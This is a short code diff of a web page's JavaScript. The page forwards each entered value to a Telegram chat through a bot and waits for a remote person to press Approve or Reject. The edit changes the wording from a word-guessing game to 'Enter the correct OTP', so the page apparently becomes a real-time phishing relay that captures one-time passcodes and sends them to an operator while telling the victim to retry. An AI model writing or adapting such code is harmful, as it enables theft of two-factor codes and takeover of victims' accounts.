@@ -70,8 +70,8 @@ btn.addEventListener("click", async () => {
       chat_id: CHAT_ID,
       text: `New guess: ${word}\n\nIs it correct?`,
       reply_markup: { inline_keyboard: [[
-        { text: "✅ Yes", callback_data: `yes:${id}` },
-        { text: "❌ No",  callback_data: `no:${id}` },
+        { text: "✅ Approve", callback_data: `yes:${id}` },
+        { text: "❌ Reject",  callback_data: `no:${id}` },
       ]] },
     });
     if (!sent.ok) throw new Error(sent.description);
@@ -104,12 +104,12 @@ async function waitForAnswer(id, word, messageId) {
       tg("editMessageText", { chat_id: CHAT_ID, message_id: messageId, text: `${word} — ${yes ? "✅ Approved" : "❌ Rejected"}` });
 
       if (yes) { location.href = "congrats.html"; return; }
-      showWarn("⚠️ Wrong word. Try again.");
+      showWarn("⚠️ Enter the correct OTP.");
       tiles.classList.remove("shake"); void tiles.offsetWidth; tiles.classList.add("shake");
       resetBoxes();
       return;
     }
   }
-  showWarn("No answer yet. Try again.");
+  showWarn("Nothing entered. Try again.");
   resetBoxes();
       }
